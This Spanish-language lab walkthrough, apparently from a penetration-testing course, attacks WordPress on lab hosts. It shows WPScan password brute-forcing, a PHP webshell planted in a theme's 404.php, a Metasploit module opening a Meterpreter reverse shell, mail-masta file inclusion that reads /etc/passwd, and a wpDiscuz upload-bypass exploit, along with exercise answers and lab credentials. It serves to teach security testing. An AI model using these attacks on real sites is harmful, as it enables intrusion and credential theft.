
# Wordpress - Ataques

## <mark style="color:purple;">Atacando WordPress</mark>

Hemos confirmado que el sitio web de la empresa se ejecuta en WordPress y hemos enumerado la versión y los complementos instalados. Ahora busquemos rutas de ataque e intentemos obtener acceso a la red interna.

Hay varias formas en que podemos abusar de la `funcionalidad incorporada` para atacar una instalación de WordPress. Trataremos el ataque por fuerza bruta de inicio de sesión contra la página `wp-login.php` y la ejecución remota de código a través del editor de temas. Estas dos tácticas se complementan entre sí, ya que primero necesitamos obtener credenciales válidas para que un usuario de nivel administrador inicie sesión en el back-end de WordPress y edite un tema.

***

## <mark style="color:purple;">Bruteforce de login en Wordpress</mark>

WPScan se puede utilizar para forzar nombres de usuario y contraseñas. El informe de escaneo de la sección anterior arrojó dos usuarios registrados en el sitio web (admin y john). La herramienta utiliza dos tipos de ataques de fuerza bruta para iniciar sesión, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) y wp-login. El método  `wp-login` intentará forzar la página de inicio de sesión estándar de WordPress, mientras que el método `xmlrpc` utiliza la API de WordPress para realizar intentos de inicio de sesión a través de `/xmlrpc.php`. Se prefiere este método `xmlrpc` porque es más rápido.

```shell-session
afsh4ck@kali$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23
```

La flag `--password-attack` se utiliza para indicar el tipo de ataque. El parámetro `-U` incluye una lista de usuarios o un archivo que contiene los nombres de los usuarios. Esto también se aplica a la opción de contraseñas `-P`. La flag `-t` es la cantidad de subprocesos que podemos ajustar hacia arriba o hacia abajo según corresponda. WPScan pudo encontrar credenciales válidas para un usuario, `john:firebird1`.

También podríamos usar CMSeek y la opción de Bruteforce CMSs.

***

## <mark style="color:purple;">Ejecución de código remoto</mark>

Con acceso administrativo a WordPress, podemos modificar el código fuente PHP para ejecutar comandos del sistema. Iniciamos sesión en WordPress con las credenciales del usuario `john`, lo que nos redireccionará al panel de administración. Hacemos clic en `Apariencia` en el panel lateral y seleccionamos `Editor de temas`. Esta página nos permitirá editar el código fuente PHP directamente. Se puede seleccionar un tema inactivo para evitar corromper el tema principal. Ya sabemos que el tema activo es Transport Gravity. Se puede elegir un tema alternativo como Twenty Nineteen en su lugar.

Hacemos click en `Select` después de seleccionar el tema y podremos editar una página poco común, como por ejemplo `404.php` para agregar un webshell.

```php
system($_GET[0]);
```

El código anterior debería permitirnos ejecutar comandos mediante el parámetro GET `0`. Agregamos esta única línea al archivo justo debajo de los comentarios para evitar modificar demasiado el contenido.  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/113/theme_editor.png" alt=""><figcaption></figcaption></figure>

Hacemos click en `Update File` en la parte inferior para guardar. Sabemos que los temas de WordPress se encuentran en `/wp-content/themes/<theme name>`. Podemos interactuar con el webshell a través del navegador o usando `cURL`. Como siempre, podemos utilizar este acceso para obtener un reverse shell interactivo y comenzar a explorar el objetivo.

```shell-session
afsh4ck@kali$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

También podríamos usar el módulo [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) de Metasploit para cargar un shell y ejecutarlo automáticamente.

El módulo carga un plugin malicioso y luego lo usa para ejecutar un `shell PHP Meterpreter`. Primero debemos configurar las opciones necesarias.

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Luego podemos emitir el comando `show options` para asegurarnos de que todo esté configurado correctamente. En este ejemplo de laboratorio, debemos especificar tanto el vhost como la dirección IP, o el exploit fallará con el error

{% hint style="danger" %}
&#x20;Exploit aborted due to failure: not-found: The target does not appear to be using WordPress.
{% endhint %}

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Una vez que estemos satisfechos con la configuración, podemos escribir `exploit` y obtener un reverse shell. Desde aquí, podríamos comenzar a enumerar el host para obtener datos confidenciales o rutas para la escalada de privilegios vertical/horizontal y el movimiento lateral.

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)
```

En el ejemplo anterior, el módulo Metasploit cargó el archivo `wCoUuUPfIO.php` en el directorio `/wp-content/plugins`. Muchos módulos Metasploit (y otras herramientas) intentan limpiar lo que han dejado de hacer, pero algunos fallan. Durante una evaluación, querríamos hacer todo lo posible para limpiar este artefacto del sistema cliente e, independientemente de si pudimos eliminarlo o no, deberíamos incluirlo en los apéndices de nuestro informe. Como mínimo, nuestro informe debería tener una sección de apéndice que incluya la siguiente información (más sobre esto en un módulo posterior).

* `Sistemas explotados` (nombre de host/IP y método de explotación)
* `Usuarios comprometidos` (nombre de cuenta, método de compromiso, tipo de cuenta (local o de dominio))
* `Artefactos creados en sistemas`
* `Cambios` (como agregar un usuario administrador local o modificar la membresía del grupo)

***

## <mark style="color:purple;">Vulnerabilidades conocidas</mark>

A lo largo de los años, el núcleo de WordPress ha sufrido una buena cantidad de vulnerabilidades, pero la gran mayoría de ellas se pueden encontrar en complementos. Según la página de estadísticas de vulnerabilidades de WordPress alojada [aquí](https://wpscan.com/statistics) , en el momento de redactar este artículo, había más de  60.000 vulnerabilidades en la base de datos de WPScan. Estas vulnerabilidades se pueden desglosar de la siguiente manera:

* 1% del núcleo de WordPress
* 95% de plugins
* 4% de temas

La cantidad de vulnerabilidades relacionadas con WordPress ha crecido de manera constante desde 2014, probablemente debido a la gran cantidad de temas y complementos gratuitos (y de pago) disponibles, y cada semana se agregan más. Por este motivo, debemos ser extremadamente minuciosos al enumerar un sitio de WordPress, ya que podemos encontrar complementos con vulnerabilidades descubiertas recientemente o incluso complementos antiguos, sin uso u olvidados que ya no cumplen ninguna función en el sitio, pero a los que aún se puede acceder.

{% hint style="info" %}
Nota: Podemos utilizar la herramienta [waybackurls](https://github.com/tomnomnom/waybackurls) para buscar versiones anteriores de un sitio de destino mediante Wayback Machine. A veces, podemos encontrar una versión anterior de un sitio de WordPress que utiliza un complemento que tiene una vulnerabilidad conocida. Si el complemento ya no se utiliza, pero los desarrolladores no lo eliminaron correctamente, es posible que aún podamos acceder al directorio en el que está almacenado y aprovechar una falla.
{% endhint %}

### **Plugins vulnerables - mail-masta**

Veamos algunos ejemplos. El complemento [mail-masta](https://wordpress.org/plugins/mail-masta/) ya no es compatible, pero ha tenido más de 2300 [descargas](https://wordpress.org/plugins/mail-masta/advanced/) a lo largo de los años. No está fuera del ámbito de la posibilidad de que nos encontremos con este complemento durante una evaluación, probablemente instalado una vez y olvidado. Desde 2016 ha sufrido una [inyección SQL no autenticada](https://www.exploit-db.com/exploits/41438) y una [inclusión de archivo local](https://www.exploit-db.com/exploits/50226) .

Echemos un vistazo al código vulnerable del complemento mail-masta:

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

Como podemos ver, el parámetro `pl` nos permite leer un archivo sin ningún tipo de validación o sanitización de entrada. Con esto, podemos leer archivos arbitrarios en el servidor web. Aprovechemos esto para ver el contenido del archivo `/etc/passwd` usando `cURL`.

```shell-session
afsh4ck@kali$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

### **Plugins vulnerables - wpDiscuz**

[wpDiscuz](https://wpdiscuz.com/) es un complemento de WordPress para mejorar la capacidad de comentar en las publicaciones de las páginas. Al momento de escribir este artículo, el complemento tenía más de [1,6 millones de descargas](https://wordpress.org/plugins/wpdiscuz/advanced/) y más de 90 000 instalaciones activas, lo que lo convierte en un complemento extremadamente popular que tenemos muchas posibilidades de encontrar durante una evaluación. Según el número de versión (7.0.4), este [exploit](https://www.exploit-db.com/exploits/49967) tiene muchas posibilidades de hacernos ejecutar un comando. El quid de la vulnerabilidad es una omisión de la carga de archivos. wpDiscuz está pensado únicamente para permitir adjuntos de imágenes. Las funciones de MIME Type de archivo podrían omitirse, lo que permitiría a un atacante no autenticado cargar un archivo PHP malicioso y obtener la ejecución remota de código. Puede encontrar más información sobre la omisión de las funciones de detección de MIME Type [aquí](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/) .

El script de explotación toma dos parámetros: la URL `-u` y la ruta a una publicación válida `-p`.

```shell-session
afsh4ck@kali$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```

El exploit tal como está escrito puede fallar, pero podemos usar `cURL` para ejecutar comandos mediante el webshell cargado. Solo tenemos que agregar `?cmd=` después de la extensión `.php` para ejecutar los comandos que podemos ver en el script del exploit:

```shell-session
afsh4ck@kali$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En este ejemplo, queremos asegurarnos de limpiar el archivo `uthsdkbywoxeebg-1629904090.8191.php` y volver a incluirlo como un artefacto de prueba en los apéndices de nuestro informe.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.98.71    http://blog.inlanefreight.local
```

### Ejercicio 1

> Realiza la enumeración de usuarios en <http://blog.inlanefreight.local>. Además de admin, ¿qué otros usuarios están presentes?

```shell-session
afsh4ck@kali$ wpscan --url http://blog.inlanefreight.local --enumerate ap --api-token qvVghA5xvEVBjjjT******************
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.inlanefreight.local/ [10.129.98.71]
[+] Started: Tue Nov 26 22:03:31 2024
<----SNIP---->

[i] User(s) Identified:
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
[+] by:
									admin       ps://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xm-release/
 | Found By: Author Posts - Display Name (Passive Detection)
 | Latest Version: 1.0.1 (up to date)
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)        8ee0
 |  Login Error Messages (Aggressive Detection)
ms/">WordPress Support Forums</a></dt>
[+] doug
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)        By: Direct Access (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 9
 | Requests Remaining: Unlimited
```

Encontramos 2 usuarios:

* `admin`
* `doug`

### Ejercicio 2

> Realiza un ataque de fuerza bruta contra el usuario descubierto. Enviar la contraseña del usuario como respuesta.

Vamos a usar WPScan aunque podríamos usar también CMSeek:

```shell-session
afsh4ck@kali$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.inlanefreight.local/ [10.129.98.71]
[+] Started: Tue Nov 26 22:06:23 2024

<----SNIP---->

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - doug / jessica1                                                                                                                                            
Trying doug / megan Time: 00:00:10 <          
```

Encontramos unas credenciales válidas: `doug:jessica1`

### Ejercicio 3

> Utilizando los métodos que se muestran en esta sección, busque otro usuario del sistema cuyo shell de inicio de sesión esté configurado en `/bin/bash`.

En la sección anterior descubrimos que este host tiene instalado una versión vulnerable del plugin Mail Masta, que nos permite leer archivos del sistema, como el `/etc/passwd`:

```
[+] mail-masta
 | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php\?pl\=/etc/passwd
</strong>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
webadmin:x:1001:1001::/home/webadmin:/bin/bash
mrb3n:x:1002:1002::/home/mrb3n:/bin/sh
</code></pre>

Vemos que hay 3 usuarios con shell `/bin/bash`, entre ellos uno que parece admin: `webadmin`

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php\?pl\=/etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001::/home/webadmin:/bin/bash
```

{% hint style="success" %}
Además de esta técnica, podríamos conseguir una shell con el módulo `wp_admin_shell_upload` de Metasploit o cargando un webshell, y leer el archivo passwd.
{% endhint %}

### Ejercicio 4

Siguiendo los pasos de esta sección, obtenga la ejecución de código remoto en el host y envíe el contenido del archivo flag.txt en el webroot.

Vamos a loguearnos con las credenciales que conseguimos: `doug:jessica1`

<figure><img src="/files/G7t9kHVx8mDuti1F5SgP" alt=""><figcaption></figcaption></figure>

Conseguimos acceder, vamos a intentar editar un tema para añadir una webshell:

<figure><img src="/files/KyO0Lg5obAGLBU886fTG" alt=""><figcaption></figcaption></figure>

```php
system($_GET[0]);
```

Nos deja editar la página y se sube el webshell a la página 404.php:

<figure><img src="/files/di61frsXnZcKFgtKwXdy" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Podríamos usar esa webshell básica que pasa desapercibida en el código fuente o sustituir una página php con el código de una webshell más potente como P0wny Shell, y acceder por el navegador.
{% endhint %}

Podemos acceder a la webshell con curl de la siguiente manera:

```shell-session
afsh4ck@kali$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php\?0\=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ahora que vemos que funciona vamos a hacer research en el objetivo para obtener la flag en el webroot `/var/www/`:

```shell-session
afsh4ck@kali$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php\?0\=ls+/var/www    
app.inlanefreight.local
blog.inlanefreight.local
dev.inlanefreight.local
drupal-acc.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal.inlanefreight.local
html
```

Concretamente vamos a acceder al directorio de `blog.inlanefreight.local`:

```shell-session
afsh4ck@kali$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php\?0\=ls+/var/www/blog.inlanefreight.local/
flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
```

Encontramos la flag con un nombre random: `flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt` y la leemos con `cat`:

```shell-session
afsh4ck@kali$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php\?0\=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
l00k_ma_un************
```
